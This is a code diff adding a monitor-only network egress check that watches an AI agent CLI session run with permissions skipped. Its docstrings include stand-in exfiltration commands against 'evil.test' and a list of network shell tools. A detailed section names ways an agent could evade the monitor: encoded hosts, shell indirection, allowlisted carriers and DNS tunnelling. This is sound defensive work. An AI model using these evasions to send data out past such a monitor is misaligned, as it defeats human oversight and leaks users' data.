@@ -83,6 +83,10 @@ __all__ = [
     # 10 — AGOV declarative agent rules, monitor-only by default (agov-det-06)
     "check_agent_rules",
     "reset_agent_gate",
+    # 11 — network egress, monitor-only by default (exa-bench-08)
+    "check_network_egress",
+    "egress_destinations",
+    "reset_egress_policy",
 ]
 
 
@@ -929,4 +933,399 @@ def check_agent_rules(
     try:
         return gate.check_tool_call(tool_name, tool_input, root=_resolve_root(repo_root))
     except Exception:  # noqa: BLE001 — see docstring
+        return None
+
+
+# ── 11. Network egress (exa-bench-08) ─────────────────────────────────────
+#
+# Until this check existed the hook had no concept of the network at all. The
+# in-process agent loop did halt the obvious exfil commands, but only
+# incidentally: `approval_gate` escalates `curl -X POST` by pattern and catches
+# everything else because `default_tier: unknown` halts anything unenumerated.
+# Allowlisting one HTTP tool, or adding a `curl` downgrade pattern, would have
+# removed that silently. Nothing modelled the destination.
+#
+# The spawned CLI has none of that. `tools/agents/adapters/claude_cli.py` runs
+# with `--dangerously-skip-permissions` (ADR D394), so neither gate is in its
+# path — this hook is the only thing between that session and the network.
+
+_EGRESS_POLICY_CACHE: Dict[str, Optional[dict]] = {}
+
+#: Tools whose destination may be written as a bare host rather than a URL.
+#: Bare-hostname extraction is restricted to these because outside them a
+#: dotted token is overwhelmingly a filename (`README.md`, `tools/foo.py`).
+_BARE_HOST_TOOLS = frozenset(
+    {"nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp",
+     "rsync", "ftp", "lftp"}
+)
+
+_EGRESS_URL_RE = re.compile(
+    r"(?i)\b[a-z][a-z0-9+.\-]{1,15}://(?P<netloc>[^\s/?\#'\"`|;&()<>\\]+)"
+)
+
+#: Legal DNS presentation characters. Applied to every extracted host because
+#: the URL regex above happily captures an interpolation left half — measured:
+#: ``f"postgresql://{os.environ[...]}"`` yielded the "host" ``{os.environ[chr``.
+_DNS_CHARS_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._\-]*[A-Za-z0-9])?$")
+
+#: Pipeline separators. Bare-host extraction is scoped to the segment whose
+#: PROGRAM is a bare-host tool, so an `ssh` mentioned inside a heredoc does not
+#: turn every dotted token in the command into a candidate hostname.
+_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[|;&\n]")
+
+#: Leading words that precede the real program without being it.
+_COMMAND_PREFIXES = frozenset(
+    {"env", "sudo", "nohup", "time", "command", "exec", "unset", "export", "cd"}
+)
+
+#: A last label that is alphabetic and 2-24 chars. Deliberately not a TLD list:
+#: a stale list would silently stop seeing new gTLDs, and being slightly broad
+#: only over-reports in a monitor-only check.
+_TLD_LIKE_RE = re.compile(r"(?i)^[a-z]{2,24}$")
+
+#: Dotted tokens that pass the TLD shape but are near-always local files.
+_NOT_A_TLD = frozenset(
+    {"py", "md", "txt", "json", "yaml", "yml", "sh", "ps1", "sql", "log",
+     "csv", "html", "js", "ts", "tsx", "jsx", "css", "cfg", "ini", "toml",
+     "lock", "gz", "zip", "tar", "png", "jpg", "svg", "pdf", "exe", "dll",
+     "so", "db", "bak", "tmp", "orig", "rej", "patch", "diff", "env"}
+)
+
+
+def _read_egress_policy(root: Path) -> Optional[dict]:
+    """Uncached read of the egress policy. None when absent, unparsable or off."""
+    try:
+        import yaml  # noqa: PLC0415
+    except ImportError:
+        return None
+    config_path = root / "args" / "agent_egress_policy.yaml"
+    if not config_path.exists():
+        return None
+    try:
+        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
+        policy = (config or {}).get("agent_egress", {})
+        if not policy.get("enabled", False):
+            return None
+        return policy
+    except Exception:  # noqa: BLE001 — a broken policy must not stop the session
+        return None
+
+
+def _load_egress_policy(root: Path) -> Optional[dict]:
+    """Memoized per repo root — the hook process is short-lived (see #5)."""
+    key = str(root)
+    if key not in _EGRESS_POLICY_CACHE:
+        _EGRESS_POLICY_CACHE[key] = _read_egress_policy(root)
+    return _EGRESS_POLICY_CACHE[key]
+
+
+def reset_egress_policy() -> None:
+    """Drop the cached policy. Tests only."""
+    _EGRESS_POLICY_CACHE.clear()
+
+
+def _strip_host(netloc: str) -> str:
+    """Reduce a URL netloc to its bare host: drop userinfo, port, brackets."""
+    host = netloc.rsplit("@", 1)[-1]          # user:pass@host -> host
+    if host.startswith("["):                   # [::1]:443 -> ::1
+        end = host.find("]")
+        if end != -1:
+            return host[1:end]
+    return host.rsplit(":", 1)[0] if host.count(":") == 1 else host
+
+
+def _looks_like_hostname(token: str) -> bool:
+    """True for a dotted token whose last label has the shape of a TLD."""
+    if not token or "/" in token or "\\" in token:
+        return False
+    labels = token.rstrip(".").split(".")
+    if len(labels) < 2 or not all(labels):
+        return False
+    last = labels[-1].lower()
+    return bool(_TLD_LIKE_RE.match(last)) and last not in _NOT_A_TLD
+
+
+def _host_is_local(host: str) -> bool:
+    """True when *host* cannot carry data off this machine.
+
+    The IP-range test is the same partition ``tools/http/egress_guard.py``
+    makes, used with the OPPOSITE sign. That module is an SSRF guard: it
+    REFUSES loopback/RFC1918 so a confused fetcher cannot reach into the
+    internal network. Here those addresses are the safe case and a public one
+    is the risk, which is why it is reimplemented rather than imported —
+    ``tools/browser/scope.py`` already skips ``egress_guard`` for loopback for
+    this exact reason.
+    """
+    if not host:
+        return True
+    host = host.strip().rstrip(".").lower()
+    if not host:
+        return True
+    try:
+        import ipaddress  # noqa: PLC0415
+
+        ip = ipaddress.ip_address(host)
+    except ValueError:
+        pass
+    except Exception:  # noqa: BLE001
+        return False
+    else:
+        return bool(
+            ip.is_private or ip.is_loopback or ip.is_link_local
+            or ip.is_multicast or ip.is_reserved or ip.is_unspecified
+        )
+    if host == "localhost" or host.endswith(".localhost"):
+        return True
+    if any(host.endswith(s) for s in (".local", ".internal", ".lan", ".home.arpa")):
+        return True
+    # A single-label name has no public DNS delegation, so it cannot address a
+    # host outside this network.
+    return "." not in host
+
+
+def _suffix_match(host: str, patterns: Sequence[str]) -> bool:
+    """Suffix match, so ``github.com`` covers ``api.github.com``."""
+    host = host.rstrip(".").lower()
+    for raw in patterns or ():
+        pattern = str(raw).strip().lstrip("*.").rstrip(".").lower()
+        if pattern and (host == pattern or host.endswith("." + pattern)):
+            return True
+    return False
+
+
+def _command_tokens(command: str) -> List[str]:
+    """Best-effort argv tokens. Falls back to whitespace splitting."""
+    try:
+        return shlex.split(command, posix=True)
+    except Exception:  # noqa: BLE001 — unbalanced quotes are common in the wild
+        return command.split()
+
+
+def egress_destinations(command: str) -> List[str]:
+    """Non-local network destinations named anywhere in *command*.
+
+    Two extraction passes, because the two evade differently:
+
+    1. **URLs, over the raw string.** Deliberately not over tokens — the point
+       is to see ``https://evil.test`` inside
+       ``python -c "urllib.request.urlopen('https://evil.test')"``, which a
+       ``curl``/``wget`` pattern list never sees.
+    2. **Bare hosts, over the tokens**, and only for the tools in
+       :data:`_BARE_HOST_TOOLS`. ``nc evil.test 4444`` carries no URL at all.
+
+    Returns hosts in first-seen order, deduplicated, already filtered to those
+    :func:`_host_is_local` calls non-local.
+    """
+    found: List[str] = []
+    seen = set()
+
+    def _add(host: str) -> None:
+        host = (host or "").strip().rstrip(".").lower()
+        if not host or host in seen:
+            return
+        if not (_DNS_CHARS_RE.match(host) or _is_ip_literal(host)):
+            return
+        if _host_is_local(host):
+            return
+        seen.add(host)
+        found.append(host)
+
+    for match in _EGRESS_URL_RE.finditer(command or ""):
+        _add(_strip_host(match.group("netloc")))
+
+    for segment in _SEGMENT_SPLIT_RE.split(command or ""):
+        if _segment_program(segment) not in _BARE_HOST_TOOLS:
+            continue
+        for token in _command_tokens(segment):
+            if token.startswith("-") or "://" in token:
+                continue
+            # socat spells it TCP:host:port; scp spells it user@host:path.
+            for part in re.split(r"[:@,]", token):
+                part = part.strip()
+                if not part or part.isdigit():
+                    continue
+                if _looks_like_hostname(part) or _is_ip_literal(part):
+                    _add(part)
+    return found
+
+
+def _is_ip_literal(token: str) -> bool:
+    try:
+        import ipaddress  # noqa: PLC0415
+
+        ipaddress.ip_address(token)
+    except Exception:  # noqa: BLE001 — not an address
+        return False
+    return True
+
+
+def _segment_program(segment: str) -> str:
+    """The program a pipeline segment actually runs, or ``""``.
+
+    Skips leading ``VAR=value`` assignments and wrappers like ``env``/``sudo``,
+    so ``env -u GITHUB_TOKEN ssh host`` reports ``ssh``. Flags are skipped only
+    while looking for the program name.
+    """
+    for token in _command_tokens(segment):
+        if "=" in token and not token.startswith("-") and "/" not in token:
+            continue  # VAR=value
+        if token.startswith("-"):
+            continue
+        name = _program_basename(token)
+        if name in _COMMAND_PREFIXES:
+            continue
+        return name
+    return ""
+
+
+def _program_basename(token: str) -> str:
+    """``/usr/bin/curl.exe`` -> ``curl``. Lowercased, extension stripped."""
+    name = token.replace("\\", "/").rsplit("/", 1)[-1].lower()
+    for suffix in (".exe", ".cmd", ".bat", ".ps1"):
+        if name.endswith(suffix):
+            name = name[: -len(suffix)]
+    return name
+
+
+def _network_invoker(command: str, invokers: Sequence[str]) -> Optional[str]:
+    """The first recognised network-capable program in *command*, if any."""
+    wanted = {str(i).strip().lower() for i in (invokers or ()) if str(i).strip()}
+    if not wanted:
+        return None
+    for token in _command_tokens(command or ""):
+        name = _program_basename(token)
+        if name in wanted:
+            return name
+    return None
+
+
+def _record_egress_finding(root: Path, policy: dict, finding: dict) -> None:
+    """Append one JSONL finding. Never raises, never blocks on failure."""
+    try:
+        import json  # noqa: PLC0415
+        from datetime import datetime, timezone  # noqa: PLC0415
+
+        rel = str(policy.get("log_path") or ".tmp/egress_findings.jsonl")
+        path = Path(rel) if Path(rel).is_absolute() else root / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        finding = dict(finding)
+        finding["at"] = datetime.now(timezone.utc).isoformat()
+        with path.open("a", encoding="utf-8") as handle:
+            handle.write(json.dumps(finding, ensure_ascii=False) + "\n")
+    except Exception:  # noqa: BLE001 — telemetry must never take the guard down
+        pass
+
+
+def check_network_egress(
+    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
+) -> Optional[str]:
+    """Block reason for a command that sends data to an unapproved destination.
+
+    Monitor-only by default: every finding is appended to the JSONL sink named
+    by ``args/agent_egress_policy.yaml``, and ``None`` is returned so the call
+    proceeds. Set ``enforce: true`` there, or ``ICDEV_EGRESS_GUARD_ENFORCE=1``,
+    to turn a ``verdict: egress`` finding into a refusal. ``ICDEV_EGRESS_GUARD=0``
+    disables it outright. Fails OPEN on every internal error.
+
+    **What it models.** The DESTINATION, not the program. A host that is neither
+    local nor allowlisted is the finding; the program is only a confidence
+    signal on top of it. That ordering is the whole point — a
+    ``curl``/``wget`` pattern list is defeated by ``python -c "urllib..."`` or a
+    raw IP, and both of those still name a destination.
+
+    Two verdicts, and they are not interchangeable:
+
+    ``egress``
+        A non-local, non-allowlisted destination AND a recognised
+        network-capable program. Blockable when enforcing.
+    ``destination_only``
+        The destination, with no recognised program. Recorded, never blocked —
+        an unrecognised program is exactly the case this check cannot decide,
+        and pretending otherwise would be the dishonest half of the control.
+
+    **Evasion boundary — what this does NOT catch.** Stated plainly because a
+    guard whose limits are implied gets trusted past them. A shell command is
+    not statically decidable, so every one of these passes:
+
+    * **Indirection through the shell.** ``curl "$URL"``, ``curl $(cat u.txt)``,
+      ``eval "$payload"``. The destination is not in the string this check sees.
+    * **Encoding.** A base64 or hex host decoded at runtime; a host assembled by
+      concatenation (``"evi"+"l.test"``); punycode nobody has normalised.
+    * **A second file.** ``python exfil.py``, ``bash deploy.sh``, or any
+      compiled binary. The destination lives in a file, and this check reads
+      commands, not file contents.
+    * **An allowlisted carrier.** ``github.com`` is allowlisted, so a gist push,
+      a branch of secrets, or a GitHub issue body is egress this permits by
+      construction. Allowlisting a host allows *everything* that host can carry.
+    * **Non-IP transports.** DNS tunnelling, ICMP, a bound listener the peer
+      connects INTO, anything already-open like an SSH master socket.
+    * **Length.** Extraction runs over the literal command text only; a
+      destination assembled across two tool calls is invisible to both.
+
+    What it does raise the cost of: the direct, unobfuscated exfil that the
+    four probes in ``tests/test_skip_permissions_compensating_controls.py``
+    represent, on the surface — the spawned CLI — where nothing was watching at
+    all. It is a tripwire with a named blind spot, not a network boundary. The
+    boundary is ``egress_policy_manager``'s NetworkPolicy, at the pod.
+    """
+    if _off("ICDEV_EGRESS_GUARD"):
+        return None
+    try:
+        root = _resolve_root(repo_root)
+        policy = _load_egress_policy(root)
+        if not policy:
+            return None
+
+        command_tools = policy.get("command_tools") or []
+        if tool_name not in command_tools:
+            return None
+        command = (tool_input or {}).get("command") or ""
+        if not isinstance(command, str) or not command.strip():
+            return None
+
+        destinations = egress_destinations(command)
+        if not destinations:
+            return None
+
+        denied = [
+            h for h in destinations
+            if _suffix_match(h, policy.get("denied_hosts") or [])
+        ]
+        unapproved = [
+            h for h in destinations
+            if h in denied
+            or not _suffix_match(h, policy.get("allowed_hosts") or [])
+        ]
+        if not unapproved:
+            return None
+
+        invoker = _network_invoker(command, policy.get("network_invokers") or [])
+        verdict = "egress" if invoker else "destination_only"
+
+        _record_egress_finding(
+            root,
+            policy,
+            {
+                "verdict": verdict,
+                "tool": tool_name,
+                "destinations": unapproved,
+                "denied": denied,
+                "invoker": invoker,
+                # The command is recorded because a finding nobody can triage is
+                # not evidence. The sink is .tmp/ (gitignored) for that reason.
+                "command": command[:2000],
+            },
+        )
+
+        enforcing = _on("ICDEV_EGRESS_GUARD_ENFORCE") or bool(policy.get("enforce"))
+        if not enforcing or verdict != "egress":
+            return None
+        return (
+            "BLOCKED: network egress to an unapproved destination "
+            f"({', '.join(unapproved)}) via '{invoker}'. Add the host to "
+            "agent_egress.allowed_hosts in args/agent_egress_policy.yaml if this "
+            "is legitimate, or set ICDEV_EGRESS_GUARD_ENFORCE=0 to downgrade "
+            "this check to monitor-only."
+        )
+    except Exception:  # noqa: BLE001 — see docstring: fails open
         return None
